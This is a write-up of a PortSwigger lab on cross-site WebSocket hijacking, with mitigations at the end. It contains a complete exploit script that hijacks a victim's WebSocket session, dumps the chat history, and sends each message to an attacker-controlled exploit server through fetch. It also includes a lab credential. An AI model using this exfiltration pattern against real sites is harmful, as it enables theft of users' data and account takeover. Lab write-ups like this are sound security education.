# PortSwigger Lab: Cross-site WebSocket hijacking

![PortSwigger](https://img.shields.io/badge/Platform-PortSwigger%20Academy-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Type](https://img.shields.io/badge/Type-CSWSH%20%2B%20Exfiltration-red)
![Status](https://img.shields.io/badge/Status-Completed-success)

Writeup of the PortSwigger lab on Cross-site WebSocket Hijacking (CSWSH) with credential exfiltration.

## Techniques Used

- Cross-site WebSocket Hijacking (CSWSH)
- SameSite=None exploitation
- Origin validation bypass
- Chat history exfiltration via fetch
- Information disclosure exploitation
- Account takeover

## Attack Summary

```
WebSocket no CSRF + SameSite=None
→ Discover READY message dumps chat
→ Test cross-origin connection (no validation)
→ Create exploit from attacker server
→ Exfiltrate all chat messages
→ Extract credentials from messages
→ Login to victim account
```

## Key Vulnerabilities

| Vulnerability | Impact |
|---------------|--------|
| **No CSRF token** | WebSocket accepts any handshake |
| **SameSite=None** | Cookie sent cross-site automatically |
| **No origin validation** | Server accepts any Origin header |
| **READY message** | Dumps entire chat history on demand |
| **Information disclosure** | Support agent revealed password in chat |

## CSWSH Attack Chain

### Step 1: No CSRF Protection
- WebSocket endpoint has no CSRF token
- No unpredictable token in handshake
- Vulnerable to cross-site connection

### Step 2: SameSite=None Cookie
- Session cookie has SameSite=None
- Cookie sent cross-site automatically
- Victim's session included in attacker's connection

### Step 3: No Origin Validation
- Server doesn't check Origin header
- Accepts connections from any domain
- Attacker can connect from exploit server

### Step 4: READY Message Exploit
- `READY` message returns all chat history
- Includes all messages with sensitive info
- Attacker receives complete chat dump

### Step 5: Exfiltration via Fetch
```javascript
fetch(attacker_url + '?' + chat_data, {mode: 'no-cors'})
```

Send each chat message to attacker's server in URL parameter.

### Step 6: Credential Extraction
Extract from chat logs:
```
User: carlos
Password: z6609kwu42e7zznpnl3l
```

### Step 7: Account Takeover
Login with extracted credentials → Account compromised.

## Complete Exploit Code

```html
<script>
websocket = new WebSocket('wss://0ae300d304df8b8485c58483009d00c3.web-security-academy.net/chat')
websocket.onopen = start
websocket.onmessage = handleReply

function start(event) {
  websocket.send("READY");
}

function handleReply(event) {
  fetch('https://exploit-0a5b004b045f8beb8568833c01d10068.exploit-server.net/?'+event.data, {mode: 'no-cors'})
}
</script>
```

## Why It Works

- **SameSite=None:** Browser automatically includes cookie cross-site
- **No origin validation:** Server trusts all origins
- **READY message:** Intentional or unintended information leak
- **Fetch + no-cors:** Bypasses CORS checks
- **Session persistence:** Connection authenticated via cookie

## Attack Impact

- Complete chat history exfiltrated
- Credentials extracted from messages
- Full account compromise
- Access to victim's account

## Mitigations

```javascript
// Validate origin on WebSocket handshake
const ALLOWED_ORIGINS = ['https://legitimate.com'];
if (!ALLOWED_ORIGINS.includes(req.headers.origin)) {
  socket.close(1008, 'Origin not allowed');
}

// Use SameSite=Strict
res.cookie('session', token, {
  sameSite: 'Strict',
  httpOnly: true,
  secure: true
});

// Validate CSRF token in WebSocket handshake
// Don't send sensitive data via READY message
```

## References

- [PortSwigger — CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)
- [MDN — WebSocket API](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket)
- [OWASP — WebSocket Security](https://owasp.org/www-community/attacks/websocket_hijacking)
- [SameSite Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite)
